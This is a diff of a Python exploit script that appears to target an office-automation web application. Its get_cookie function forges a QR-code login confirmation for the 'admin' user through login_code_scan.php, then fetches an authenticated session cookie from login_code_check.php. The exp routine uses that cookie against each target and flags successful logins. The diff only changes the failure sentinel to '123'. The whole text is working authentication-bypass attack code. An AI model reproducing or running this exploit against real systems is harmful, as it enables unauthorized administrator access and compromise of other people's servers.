@@ -38,7 +38,7 @@ def get_cookie(url):
             if req1.status_code == 200 and status != -1:
                 codeUid = json.loads(req1.text[status:])["code_uid"]
             else:
-                return ""
+                return "123"
         req2 = requests.post(url+ "/general/login_code_scan.php", data={"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}, headers=checkHeader, verify=False, timeout=25, proxies=proxy)
         if req2.status_code == 200 and json.loads(req2.text)["status"] == "1":
             req3 = requests.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid, headers=checkHeader, verify=False, timeout=25, proxies=proxy)
@@ -47,7 +47,7 @@ def get_cookie(url):
                 return cookie
     except:
         pass
-    return ""
+    return "123"
     
 
 def exp(u):
@@ -64,7 +64,7 @@ def exp(u):
     printFlag = ""
 
     cookie = get_cookie(u)
-    if cookie:
+    if cookie != "123":
         printFlag = "[Login]：" + u + "\n"
     header["Cookie"] = cookie
 
